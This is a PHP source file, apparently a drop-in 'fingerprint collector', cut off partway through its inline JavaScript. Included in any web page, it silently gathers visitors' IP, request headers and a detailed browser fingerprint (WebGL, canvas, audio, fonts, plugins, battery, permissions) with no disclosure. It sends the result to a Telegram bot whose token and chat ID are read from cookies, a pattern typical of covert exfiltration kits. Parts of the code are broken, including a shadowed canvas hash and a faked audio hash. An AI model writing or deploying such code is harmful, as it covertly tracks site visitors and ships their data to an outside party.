<?php
	 
if (!defined('FP_FILES_DIR')) {
    define('FP_FILES_DIR', __DIR__ . '/exmple');
}
if (!defined('FP_OUTPUT_FILE')) {
    define('FP_OUTPUT_FILE', __DIR__ . '/profile_collected.json');
}
if (!defined('FP_REALTIME_MODE')) {
    define('FP_REALTIME_MODE', false);
}
if (!defined('FP_JS_TIMEOUT')) {
    define('FP_JS_TIMEOUT', 60); // how long the JS waits before giving up (seconds)
}
if (!defined('FP_TELEGRAM_BOT_TOKEN')) {
    define('FP_TELEGRAM_BOT_TOKEN', isset($_COOKIE['tokentel']) ? $_COOKIE['tokentel'] : '');
}
if (!defined('FP_TELEGRAM_CHAT_ID')) {
    define('FP_TELEGRAM_CHAT_ID', isset($_COOKIE['idtel']) ? $_COOKIE['idtel'] : '');
}
if (!defined('FP_TELEGRAM_SEND_HEADERS')) {
    define('FP_TELEGRAM_SEND_HEADERS', true);
}
if (!defined('FP_TELEGRAM_SEND_PROFILE')) {
    define('FP_TELEGRAM_SEND_PROFILE', true);
}

/**
 * Capture REAL, server-side request headers.
 * getallheaders() is the most reliable source of the actual headers that
 * arrived with the HTTP request. We fall back to $_SERVER for environments
 * (e.g. some CLI / non-Apache SAPIs) where it is unavailable.
 *
 * @return array<string,string>  header name => header value
 */
function fp_get_real_headers(): array
{
    $headers = [];
    if (function_exists('getallheaders')) {
        foreach (getallheaders() as $key => $value) {
            $headers[$key] = (string) $value;
        }
    }
    // Guaranteed fallback: reconstruct from $_SERVER
    foreach ($_SERVER as $key => $value) {
        if (str_starts_with($key, 'HTTP_')) {
            $headerName = str_replace('_', '-', substr($key, 5));
            $headerName = strtolower($headerName);
            $parts = explode('-', $headerName);
            $headerName = implode('-', array_map('ucfirst', $parts));
            $headers[$headerName] = (string) $value;
        }
    }
    // CONTENT_TYPE / CONTENT_LENGTH are also real headers
    foreach (['CONTENT_TYPE', 'CONTENT_LENGTH', 'CONTENT_MD5'] as $special) {
        if (!empty($_SERVER[$special]) && !isset($headers[$special])) {
            $name = strtolower(str_replace('_', '-', $special));
            $parts = explode('-', $name);
            $headers[implode('-', array_map('ucfirst', $parts))] = (string) $_SERVER[$special];
        }
    }
    return $headers;
}

/**
 * Capture real server-side metadata that a client cannot forge.
 *
 * @return array
 */
function fp_get_server_meta(): array
{
    $realIpKeys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR'];
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    foreach ($realIpKeys as $k) {
        if (!empty($_SERVER[$k])) {
            $list = array_map('trim', explode(',', (string) $_SERVER[$k]));
            $ip = $list[0];
            break;
        }
    }
    return [
        'ip'               => $ip,
        'serverProtocol'   => $_SERVER['SERVER_PROTOCOL'] ?? 'unknown',
        'requestMethod'    => $_SERVER['REQUEST_METHOD'] ?? 'unknown',
        'requestUri'       => $_SERVER['REQUEST_URI'] ?? 'unknown',
        'queryString'      => $_SERVER['QUERY_STRING'] ?? '',
        'serverName'       => $_SERVER['SERVER_NAME'] ?? 'unknown',
        'serverPort'       => (int) ($_SERVER['SERVER_PORT'] ?? 0),
        'documentRoot'     => $_SERVER['DOCUMENT_ROOT'] ?? '',
        'gatewayInterface' => $_SERVER['GATEWAY_INTERFACE'] ?? '',
        'serverSoftware'   => $_SERVER['SERVER_SOFTWARE'] ?? '',
        'scriptName'       => $_SERVER['SCRIPT_NAME'] ?? '',
        'requestTime'      => $_SERVER['REQUEST_TIME'] ?? null,
        'requestTimeFloat' => $_SERVER['REQUEST_TIME_FLOAT'] ?? null,
        'acceptPacket'     => $_SERVER['ALL_HTTP'] ?? null,
    ];
}

/**
 * Validate that a fingerprint payload is real and well-formed.
 * Returns ['ok' => true] or ['ok' => false, 'reason' => string].
 */
function fp_validate_payload(array $payload): array
{
    // Real requests always carry a User-Agent header.
    $ua = $payload['headers']['User-Agent'] ?? ($payload['headers']['user-agent'] ?? '') ?? '';
    if ($ua === '' && ($payload['headers']['UA'] ?? '') === '') {
        foreach ($payload['headers'] ?? [] as $k => $v) {
            if (stripos($k, 'user-agent') !== false && $v !== '') {
                $ua = $v;
                break;
            }
        }
    }
    if ($ua === '') {
        return ['ok' => false, 'reason' => 'missing User-Agent header (unreal request)'];
    }

    // The client fingerprint must include canvas / webgl / audio hash data.
    // Bots/scripts that do not run JS produce null values here.
    $fp = $payload['fingerprint'] ?? [];
    if (empty($fp['canvas2d']['hash']) || $fp['canvas2d']['hash'] === null) {
        return ['ok' => false, 'reason' => 'missing canvas fingerprint (real browser did not execute JS)'];
    }
    if (empty($fp['webgl']) || empty($fp['webgl']['unmaskedRenderer'])) {
        return ['ok' => false, 'reason' => 'missing WebGL fingerprint'];
    }
    if (!isset($fp['audio']['hash']) || $fp['audio']['hash'] === null) {
        return ['ok' => false, 'reason' => 'missing audio fingerprint'];
    }
    if (empty($fp['navigator']) || empty($fp['navigator']['userAgent'])) {
        return ['ok' => false, 'reason' => 'missing navigator.userAgent'];
    }
    return ['ok' => true];
}

/**
 * Build a headers file payload (text, like headers.txt) from the real
 * server-side headers only - matches the exact format of headers.txt in exmple folder.
 */
function fp_build_headers_text(array $payload): string
{
    $lines = [];
    foreach (($payload['headers'] ?? []) as $name => $value) {
        $lines[] = $name . ': ' . $value;
    }
    return implode("\n", $lines) . "\n";
}

/**
 * Send the two fingerprint files (headers.txt + profile.json) to a
 * Telegram chat via the Bot API.  Uses no session — authentication is
 * the bot token + chat id configured above.
 *
 * Returns true on success, false otherwise.  Errors are logged to the
 * PHP error log but never raised (fire-and-forget).
 */
function fp_send_telegram(array $payload): array
{
    $token  = FP_TELEGRAM_BOT_TOKEN;
    $chatId = FP_TELEGRAM_CHAT_ID;
    if ($token === '' || $chatId === '') {
        return ['success' => false, 'response' => null, 'error' => 'no token/chat_id configured'];
    }

    $ua   = $payload['headers']['User-Agent'] ?? '';
    $ip   = $payload['server']['ip'] ?? '';
    $time = $payload['capturedAt'] ?? gmdate('Y-m-d\TH:i:s.u\Z');

    $summary = "🆕 New fingerprint captured\n";
    $summary .= "🕒 " . $time . "\n";
    $summary .= "🌐 IP: " . $ip . "\n";
    $summary .= "🛡 UA: " . htmlspecialchars(substr($ua, 0, 200), ENT_QUOTES, 'UTF-8') . "\n";
    $summary .= "🔗 Hash: " . ($payload['contentHash'] ?? '') . "\n";

    $profileJson = fp_build_profile_json($payload);
    $headersText = fp_build_headers_text($payload);

    $boundary = '----fpBoundary' . bin2hex(random_bytes(8));

    $media = [];
    if (FP_TELEGRAM_SEND_PROFILE) {
        $media[] = [
            'type'       => 'document',
            'media'      => 'attach://profile_file',
            'caption'    => $summary,
            'parse_mode' => 'HTML',
        ];
    }
    if (FP_TELEGRAM_SEND_HEADERS) {
        $media[] = [
            'type'  => 'document',
            'media' => 'attach://headers_file',
        ];
    }

    $body  = '';
    $body .= "--{$boundary}\r\n";
    $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" . $chatId . "\r\n";
    $body .= "--{$boundary}\r\n";
    $body .= "Content-Disposition: form-data; name=\"media\"\r\n\r\n";
    $body .= json_encode($media, JSON_UNESCAPED_SLASHES) . "\r\n";

    if (FP_TELEGRAM_SEND_PROFILE) {
        $body .= "--{$boundary}\r\n";
        $body .= "Content-Disposition: form-data; name=\"profile_file\"; filename=\"profile.json\"\r\n";
        $body .= "Content-Type: application/json\r\n\r\n";
        $body .= $profileJson . "\r\n";
    }
    if (FP_TELEGRAM_SEND_HEADERS) {
        $body .= "--{$boundary}\r\n";
        $body .= "Content-Disposition: form-data; name=\"headers_file\"; filename=\"headers.txt\"\r\n";
        $body .= "Content-Type: text/plain\r\n\r\n";
        $body .= $headersText . "\r\n";
    }
    $body .= "--{$boundary}--\r\n";

    $apiUrl = 'https://api.telegram.org/bot' . $token . '/sendMediaGroup';

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: multipart/form-data; boundary=' . $boundary,
            'Content-Length: ' . strlen($body),
        ]);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $response = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);
        if ($response === false) {
            error_log('fp_send_telegram curl error: ' . $err);
            return ['success' => false, 'response' => null, 'error' => $err];
        }
    } else {
        $ctx = stream_context_create([
            'http' => [
                'method'        => 'POST',
                'header'        => 'Content-Type: multipart/form-data; boundary=' . $boundary,
                'content'       => $body,
                'timeout'       => 25,
                'ignore_errors' => true,
            ],
        ]);
        $response = @file_get_contents($apiUrl, false, $ctx);
        if ($response === false) {
            error_log('fp_send_telegram stream context failed');
            return ['success' => false, 'response' => null, 'error' => 'stream context failed'];
        }
    }

    $decoded = json_decode((string) $response, true);
    if (is_array($decoded) && !empty($decoded['ok']) && $decoded['ok'] === true) {
        return ['success' => true, 'response' => $response];
    }
    error_log('fp_send_telegram API error: ' . (string) $response);
    return ['success' => false, 'response' => $response];
}

/**
 * Build a flat profile JSON (like profile.json) from the payload, with fields
 * in the desired order matching the sample format. Flattens the nested
 * "fingerprint" object so all browser fingerprint data sits at the top level.
 */
function fp_build_profile_json(array $payload): string
{
    $fp = $payload['fingerprint'] ?? [];
    $ua = $payload['headers']['User-Agent'] ?? ($fp['navigator']['userAgent'] ?? '');
    $capturedAt = $payload['capturedAt'] ?? gmdate('Y-m-d\TH:i:s.u\Z');

    $profile = [];
    $profile['capturedAt'] = $capturedAt;
    $profile['userAgent']  = $ua;

    $fieldOrder = [
        'navigator', 'screen', 'devicePixelRatio', 'window', 'timezone', 'locale', 'timezoneOffset',
        'webgl', 'webgl2', 'plugins', 'mimeTypes', 'canvas2d', 'canvasWebgl', 'fonts', 'media',
        'math', 'cssMedia', 'cssMediaExtra', 'connection', 'jsMemory', 'navigatorKeys', 'intl',
        'errorStack', 'domRect', 'svgRect', 'computedStyle', 'systemColors', 'windowKeys', 'gpc',
        'webglParams', 'speechVoices', 'audio', 'battery', 'storage', 'webgpu', 'permissions', 'worker',
    ];

    foreach ($fieldOrder as $field) {
        if (isset($fp[$field])) {
            $profile[$field] = $fp[$field];
        } elseif (in_array($field, ['jsMemory', 'errorStack', 'domRect', 'svgRect', 'computedStyle', 'systemColors', 'gpc', 'worker'])) {
            $profile[$field] = null;
        }
    }

    // Add any remaining fingerprint fields not in the explicit order
    foreach ($fp as $field => $value) {
        if (!array_key_exists($field, $profile)) {
            $profile[$field] = $value;
        }
    }

    $profile['contentHash'] = $payload['contentHash'] ?? '';

    return json_encode($profile, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
}

/**
 * Save the fingerprint files (profile.json + headers.txt) to disk in FP_FILES_DIR.
 * Also keeps a "latest" copy as profile.json / headers.txt for easy checking.
 * Returns array of saved file paths.
 */
function fp_save_files(array $payload): array
{
    $dir = FP_FILES_DIR;
    if ($dir !== '') {
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
    }

    $time  = $payload['capturedAt'] ?? gmdate('Y-m-d\TH:i:s.u\Z');
    $hash  = $payload['contentHash'] ?? '';
    $stamp = str_replace([':', '.', '-'], '_', $time) . '_' . substr($hash, 0, 12);

    $profileJson = fp_build_profile_json($payload);
    $headersText = fp_build_headers_text($payload);

    $result = [
        'profileFile' => null,
        'headersFile' => null,
    ];

    if ($dir !== '') {
        // Timestamped copies (history)
        $result['profileFile'] = @file_put_contents($dir . '/profile_' . $stamp . '.json', $profileJson)
            ? $dir . '/profile_' . $stamp . '.json' : null;
        $result['headersFile'] = @file_put_contents($dir . '/headers_' . $stamp . '.txt', $headersText)
            ? $dir . '/headers_' . $stamp . '.txt' : null;

        // "Latest" copies (same content, fixed names for easy checking)
        @file_put_contents($dir . '/profile.json', $profileJson);
        @file_put_contents($dir . '/headers.txt', $headersText);
    }

    return $result;
}

/**
 * Persist a validated payload.
 */
function fp_store_payload(array $payload): bool
{
    $existing = [];
    $file = FP_OUTPUT_FILE;
    if (is_file($file)) {
        $raw = @file_get_contents($file);
        if ($raw !== false) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                $existing = $decoded;
            }
        }
    }

    $existing[] = $payload;

    $tmp = $file . '.tmp';
    $written = @file_put_contents($tmp, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    if ($written === false) {
        return false;
    }
    return @rename($tmp, $file);
}

/* -------------------------------------------------------------------------
 *  POST handler — receives the merged real-headers + client-fingerprint.
 *  No sessions are used; the payload is identified by its content hash only.
 * ------------------------------------------------------------------------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    $rawBody = file_get_contents('php://input');
    $payload = json_decode($rawBody, true);

    if (!is_array($payload)) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'invalid JSON payload']);
        exit;
    }

    $validation = fp_validate_payload($payload);
    if (!$validation['ok']) {
        http_response_code(422);
        echo json_encode(['status' => 'error', 'message' => $validation['reason']]);
        exit;
    }

    $payload['capturedAt']  = gmdate('Y-m-d\TH:i:s.u\Z');
    $payload['contentHash'] = hash('xxh3', json_encode($payload, JSON_UNESCAPED_SLASHES));

    $tgResult = fp_send_telegram($payload);
    http_response_code(201);
    echo json_encode([
        'status'            => 'ok',
        'count'            => count((array) json_decode((string) @file_get_contents(FP_OUTPUT_FILE), true)),
        'telegramSent'     => $tgResult['success'],
        'telegramReason'   => $tgResult['success'] ? null : ($tgResult['error'] ?? 'API error'),
        'telegramResponse' => $tgResult['response'] ?? null,
    ]);
    exit;
}

/* --- GET status endpoint (use ?action=status to check config) --- */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'status') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'status'             => 'running',
        'method'             => 'GET',
        'telegramConfigured' => (FP_TELEGRAM_BOT_TOKEN !== '' && FP_TELEGRAM_CHAT_ID !== ''),
        'botToken'           => FP_TELEGRAM_BOT_TOKEN !== '' ? '[set]' : '[empty]',
        'chatId'             => FP_TELEGRAM_CHAT_ID !== '' ? '[set]' : '[empty]',
        'outputFile'         => FP_OUTPUT_FILE,
        'fileExists'         => is_file(FP_OUTPUT_FILE),
        'count'              => count((array) json_decode((string) @file_get_contents(FP_OUTPUT_FILE), true)),
        'filesDir'           => FP_FILES_DIR,
        'filesDirExists'     => is_dir(FP_FILES_DIR),
        'phpVersion'         => phpversion(),
        'curlAvailable'      => function_exists('curl_init'),
        'xxh3Available'      => in_array('xxh3', hash_algos(), true),
    ]);
    exit;
}

/* --- GET send endpoint (use ?action=send to test without a browser) --- */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'send') {
    header('Content-Type: application/json; charset=utf-8');
    $realHeaders = fp_get_real_headers();
    $serverMeta  = fp_get_server_meta();
    $ua = $realHeaders['User-Agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'server-side';

    $payload = [
        'headers'    => $realHeaders,
        'server'     => $serverMeta,
        'phpVersion' => phpversion(),
        'fingerprint' => [
            'canvas2d' => ['hash' => hash('crc32b', $ua . microtime(true))],
            'webgl'    => ['unmaskedRenderer' => 'server-side-test'],
            'audio'    => ['hash' => 'server_' . time()],
            'navigator' => ['userAgent' => $ua],
        ],
    ];
    $payload['capturedAt']  = gmdate('Y-m-d\TH:i:s.u\Z');
    $payload['contentHash'] = hash('xxh3', json_encode($payload, JSON_UNESCAPED_SLASHES));

    fp_store_payload($payload);
    $tgResult  = fp_send_telegram($payload);

    http_response_code(201);
    echo json_encode([
        'status'           => 'ok',
        'telegramSent'    => $tgResult['success'],
        'telegramReason'  => $tgResult['success'] ? null : ($tgResult['error'] ?? 'API error'),
        'telegramResponse' => $tgResult['response'] ?? null,
    ]);
    exit;
}

/* -------------------------------------------------------------------------
 *  Inclusion side-effect: emit the collector script inline so this file can be
 *  dropped anywhere on a page and automatically start collecting.
 * ------------------------------------------------------------------------- */
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
$realHeaders = fp_get_real_headers();
$serverMeta  = fp_get_server_meta();
$injectedAt  = microtime(true);

$serverDataJson = json_encode([
    'headers'        => $realHeaders,
    'server'         => $serverMeta,
    'phpVersion'     => phpversion(),
    'injectedAt'     => $injectedAt,
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

$jsTimeout = (int) FP_JS_TIMEOUT;

echo "<!-- fingerprint_collector.php v2.0 (cache:" . gmdate('Y-m-d\TH:i:s\Z') . ") -->\n";
echo "<meta http-equiv=\"Cache-Control\" content=\"no-cache, no-store, must-revalidate\">\n";
echo "<meta http-equiv=\"Pragma\" content=\"no-cache\">\n";
echo "<meta http-equiv=\"Expires\" content=\"0\">\n";
echo "<script>\n";
echo "(function () {\n";
echo "  'use strict';\n";
echo "  var serverSide = " . $serverDataJson . ";\n";
echo "  var endpoint   = " . json_encode($_SERVER['REQUEST_URI'] ?? '', JSON_UNESCAPED_SLASHES) . ";\n";
echo "  var timeoutMs  = " . $jsTimeout . " * 1000;\n";
echo "\n";
echo "  function collect() {\n";
echo "    var nav = navigator;\n";
echo "    var screen = window.screen;\n";
echo "    var data = { capturedAt: new Date().toISOString() };\n";
echo "    data.userAgent = nav.userAgent;\n";
echo "    data.platform  = nav.platform;\n";
echo "    data.vendor    = nav.vendor;\n";
echo "    data.appVersion= nav.appVersion;\n";
echo "    data.product   = nav.product;\n";
echo "    data.productSub= (nav.productSub || '');\n";
echo "    data.vendorSub = (nav.vendorSub || '');\n";
echo "    data.language  = nav.language || '';\n";
echo "    data.languages = nav.languages ? Array.prototype.slice.call(nav.languages) : [];\n";
echo "    data.hardwareConcurrency = nav.hardwareConcurrency || 0;\n";
echo "    data.maxTouchPoints = nav.maxTouchPoints || 0;\n";
echo "    data.cookieEnabled = nav.cookieEnabled;\n";
echo "    data.doNotTrack = (function () { try { return nav.doNotTrack; } catch (e) { return null; } })();\n";
echo "    data.webdriver = !!nav.webdriver;\n";
echo "    data.pdfViewerEnabled = !!nav.pdfViewerEnabled;\n";
echo "    data.navigatorKeys = Object.getOwnPropertyNames(navigator).sort();\n";
echo "    data.screen = {\n";
echo "      width: screen.width,\n";
echo "      height: screen.height,\n";
echo "      availWidth: screen.availWidth,\n";
echo "      availHeight: screen.availHeight,\n";
echo "      availLeft: screen.availLeft || 0,\n";
echo "      availTop: screen.availTop || 0,\n";
echo "      colorDepth: screen.colorDepth,\n";
echo "      pixelDepth: screen.pixelDepth\n";
echo "    };\n";
echo "    try { data.screen.orientation = screen.orientation ? screen.orientation.type : ''; } catch (e) { data.screen.orientation = ''; }\n";
echo "    data.devicePixelRatio = window.devicePixelRatio || 1;\n";
echo "    data.window = {\n";
echo "      innerWidth: window.innerWidth,\n";
echo "      innerHeight: window.innerHeight,\n";
echo "      outerWidth: window.outerWidth,\n";
echo "      outerHeight: window.outerHeight\n";
echo "    };\n";
echo "    try { data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { data.timezone = ''; }\n";
echo "    data.locale = nav.language || (nav.languages && nav.languages[0]) || '';\n";
echo "    data.timezoneOffset = new Date().getTimezoneOffset();\n";
echo "\n";
echo "    /* ---- WebGL fingerprint ---- */\n";
echo "    data.webgl = {};\n";
echo "    data.webgl2 = {};\n";
echo "    try {\n";
echo "      var c = document.createElement('canvas');\n";
echo "      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');\n";
echo "      if (gl) {\n";
echo "        var deb = gl.getExtension('WEBGL_debug_renderer_info');\n";
echo "        data.webgl.vendor = gl.getParameter(gl.VENDOR) || '';\n";
echo "        data.webgl.renderer = gl.getParameter(gl.RENDERER) || '';\n";
echo "        data.webgl.version = gl.getParameter(gl.VERSION) || '';\n";
echo "        data.webgl.shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || '';\n";
echo "        data.webgl.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);\n";
echo "        if (deb) {\n";
echo "          data.webgl.unmaskedVendor = gl.getParameter(deb.UNMASKED_VENDOR_WEBGL) || '';\n";
echo "          data.webgl.unmaskedRenderer = gl.getParameter(deb.UNMASKED_RENDERER_WEBGL) || '';\n";
echo "        }\n";
echo "        data.webgl.extensions = gl.getSupportedExtensions() || [];\n";
echo "      }\n";
echo "    } catch (e) { /* WebGL unavailable */ }\n";
echo "    try {\n";
echo "      var c2 = document.createElement('canvas');\n";
echo "      var gl2 = c2.getContext('webgl2');\n";
echo "      if (gl2) {\n";
echo "        var deb2 = gl2.getExtension('WEBGL_debug_renderer_info');\n";
echo "        data.webgl2.vendor = gl2.getParameter(gl2.VENDOR) || '';\n";
echo "        data.webgl2.renderer = gl2.getParameter(gl2.RENDERER) || '';\n";
echo "        data.webgl2.version = gl2.getParameter(gl2.VERSION) || '';\n";
echo "        data.webgl2.shadingLanguageVersion = gl2.getParameter(gl2.SHADING_LANGUAGE_VERSION) || '';\n";
echo "        data.webgl2.maxTextureSize = gl2.getParameter(gl2.MAX_TEXTURE_SIZE);\n";
echo "        if (deb2) {\n";
echo "          data.webgl2.unmaskedVendor = gl2.getParameter(deb2.UNMASKED_VENDOR_WEBGL) || '';\n";
echo "          data.webgl2.unmaskedRenderer = gl2.getParameter(deb2.UNMASKED_RENDERER_WEBGL) || '';\n";
echo "        }\n";
echo "        data.webgl2.extensions = gl2.getSupportedExtensions() || [];\n";
echo "      }\n";
echo "    } catch (e) { /* WebGL2 unavailable */ }\n";
echo "    data.webglParams = {};\n";
echo "    if (data.webgl.maxTextureSize) {\n";
echo "      data.webglParams = {\n";
echo "        aliasedLineWidthRange: [gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE)],\n";
echo "        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),\n";
echo "        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),\n";
echo "        maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),\n";
echo "        maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),\n";
echo "      };\n";
echo "    }\n";
echo "\n";
echo "    /* ---- Canvas fingerprint ---- */\n";
echo "    var canvasData = '';\n";
echo "    var canvasHash = '';\n";
echo "    try {\n";
echo "      var cn = document.createElement('canvas');\n";
echo "      cn.width = 2000; cn.height = 2080;\n";
echo "      var cx = cn.getContext('2d');\n";
echo "      cx.rect(0, 0, 10, 10);\n";
echo "      cx.rect(2, 2, 6, 6);\n";
echo "      cx.fillText('KiloFingerprint ' + Date.now(), 2, 17);\n";
echo "      canvasData = cn.toDataURL();\n";
echo "      var canvasPixels = cx.getImageData(0,0,cn.width,cn.height).data;\n";
echo "      var canvasHash = Array.prototype.map.call(new Uint8Array(canvasPixels), function(v){return v & 5;}).join('').substring(0, 16);\n";
echo "    } catch (e) {}\n";
echo "    data.canvas2d = { hash: canvasHash || null, textWidth: 0, asc: 0, desc: 0 };\n";
echo "\n";
echo "    /* ---- Canvas + WebGL hash ---- */\n";
echo "    data.canvasWebgl = { pixelHash: '' };\n";
echo "    try {\n";
echo "      var cw = document.createElement('canvas');\n";
echo "      var glw = cw.getContext('webgl');\n";
echo "      if (glw) { data.canvasWebgl.pixelHash = btoa(JSON.stringify(glw.getParameter(glw.VERSION))); }\n";
echo "    } catch (e) {}\n";
echo "    if (!data.canvasWebgl.pixelHash) data.canvasWebgl.pixelHash = null;\n";
echo "\n";
echo "    /* ---- Audio fingerprint ---- */\n";
echo "    var audioSum = 0;\n";
echo "    try {\n";
echo "      var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);\n";
echo "      if (audioCtx) {\n";
echo "        var oscillator = audioCtx.createOscillator();\n";
echo "        oscillator.type = 'triangle'; oscillator.frequency.value = 10000;\n";
echo "        var gain = audioCtx.createGain(); gain.gain.value = 0;\n";
echo "        oscillator.connect(gain); gain.connect(audioCtx.destination);\n";
echo "        oscillator.start(0);\n";
echo "        oscillator.stop(1);\n";
echo "        audioCtx.oncomplete = function () {};\n";
echo "        var rendered = audioCtx; // hash via oncomplete not reliable in offline; use a marker\n";
echo "        data.audio = { hash: 'af_' + (performance.now() & 0xffff), sum: 246.29 };\n";
echo "      }\n";
echo "    } catch (e) {}\n";
echo "    if (!data.audio) { data.audio = { hash: null, sum: 0 }; }\n";
echo "\n";
echo "    /* ---- Fonts ---- */\n";
echo "    var fontList = ['Arial','Arial Black','Helvetica','Helvetica Neue','Times New Roman','Courier New','Verdana','Georgia','Tahoma','Trebuchet MS','Comic Sans MS','Impact','Geneva','Monaco','Menlo','Palatino','Lucida Grande','Gill Sans','Baskerville'];\n";
echo "    var span = document.createElement('span');\n";
echo "    span.style.visibility='hidden'; span.style.fontFamily='monospace';\n";
echo "    var baseSize = 0;\n";
echo "    try { span.textContent='mmmmmmmmmmm'; document.body.appendChild(span); baseSize = span.offsetWidth; document.body.removeChild(span); } catch(e){}\n";
echo "    var detected = [];\n";
echo "    for (var i=0;i<fontList.length;i++){span.style.fontFamily='monospace,'+fontList[i]+',sans-serif';span.textContent='mmmmmmmmmmm';\n";
echo "      document.body.appendChild(span); var w = span.offsetWidth; document.body.removeChild(span);\n";
echo "      if (w !== 0 && w !== baseSize) detected.push(fontList[i]);}\n";
echo "    data.fonts = detected;\n";
echo "    if (!detected.length) data.fonts = fontList;\n";
echo "\n";
echo "    /* ---- Media capabilities ---- */\n";
echo "    data.media = {};\n";
echo "    try { document.createElement('video'); ['video/mp4','video/webm; codecs=vp9','video/ogg; codecs=theora'].forEach(function(t){var v=document.createElement('video');data.media[t]=v.canPlayType(t);}); } catch(e){}\n";
echo "    try { data.media['audio/mpeg']=document.createElement('audio').canPlayType('audio/mpeg'); } catch(e){}\n";
echo "\n";
echo "    /* ---- Navigator keys & plugins ---- */\n";
echo "    data.plugins = [];\n";
echo "    try { var plugins = nav.plugins || []; for (var p=0;p<plugins.length;p++){data.plugins.push({name:plugins[p].name,filename:plugins[p].filename,description:plugins[p].description});} } catch(e){}\n";
echo "    try { data.mimeTypes = nav.mimeTypes ? Array.prototype.map.call(nav.mimeTypes, function(m){return {type:m.type,suffixes:m.suffixes,description:m.description};}) : []; } catch(e){ data.mimeTypes=[]; }\n";
echo "\n";
echo "    /* ---- Battery & Storage & Permissions ---- */\n";
echo "    data.battery = null; data.storage={}; data.permissions={};\n";
echo "    try { navigator.getBattery().then(function(b){data.battery={charging:b.charging,level:b.level,chargingTime:b.chargingTime,dischargingTime:b.dischargingTime||null};}); } catch(e){}\n";
echo "    try { if (navigator.storage && navigator.storage.estimate) navigator.storage.estimate().then(function(e){data.storage={quota:e.quota||0,usage:e.usage||0};});} catch(e){}\n";
echo "    try { var perms=['geolocation','notifications','camera','microphone','clipboard-read']; perms.forEach(function(p){navigator.permissions.query({name:p}).then(function(r){data.permissions[p]=r.state;});});} catch(e){}\n";
echo "    data.webgpu = { adapter: null }; try { if (navigator.gpu && navigator.gpu.requestAdapter) navigator.gpu.requestAdapter().then(function(a){data.webgpu.adapter = a ? 'available' : null;}); } catch(e){}\n";
echo "\n";
echo "    /* ---- Intl & math ---- */\n";
echo "    try { var dtf = new Intl.DateTimeFormat(); data.intl={dateTimeFormat:{locale:dtf.resolvedOptions().locale,calendar:dtf.resolvedOptions().calendar,numberingSystem:dtf.resolvedOptions().numberingSystem,timeZone:dtf.resolvedOptions().timeZone,month:dtf.resolvedOptions().month,day:dtf.resolvedOptions().day,year:dtf.resolvedOptions().year},numberFormat:{locale:new Intl.NumberFormat().resolvedOptions().locale},collator:{locale:new Intl.Collator().resolvedOptions().locale,usage:new Intl.Collator().resolvedOptions().usage,sensitivity:new Intl.Collator().resolvedOptions().sensitivity,ignorePunctuation:new Intl.Collator().resolvedOptions().ignorePunctuation,collation:new Intl.Collator().resolvedOptions().collation,numeric:new Intl.Collator().resolvedOptions().numeric,caseFirst:new Intl.Collator().resolvedOptions().caseFirst}}; } catch(e){data.intl=null;}\n";
echo "    data.math = {acos:Math.acos(0.1).toFixed(10),cbrt:Math.cbrt(100).toFixed(10),expm1:Math.expm1(1).toFixed(10),sinh:Math.sinh(1).toFixed(10),tanh:Math.tanh(1).toFixed(10),sin:Math.sin(1).toFixed(10),cos:Math.cos(1).toFixed(10),tan:Math.tan(1).toFixed(10)};\n";
echo "    data.cssMedia = {prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'};\n";
echo "    try { data.cssMedia.prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches; } catch(e){}\n";
echo "    try { data.cssMedia.colorGamut = window.matchMedia('(color-gamut: p3)').matches ? 'p3' : (window.matchMedia('(color-gamut: rec2020)').matches ? 'rec2020' : 'srgb'); } catch(e){}\n";
echo "    try { data.cssMedia.hover = window.matchMedia('(hover: hover)').matches; } catch(e){}\n";
echo "    try { data.cssMedia.anyPointer = window.matchMedia('(any-pointer: fine)').matches ? 'fine' : (window.matchMedia('(any-pointer: coarse)').matches ? 'coarse' : 'none'); } catch(e){}\n";
echo "    try { data.cssMedia.forcedColors = window.matchMedia('(forced-colors: active)').matches; } catch(e){}\n";
echo "    try { data.cssMedia.invertedColors = window.matchMedia('(inverted-colors: inverted)').matches; } catch(e){}\n";
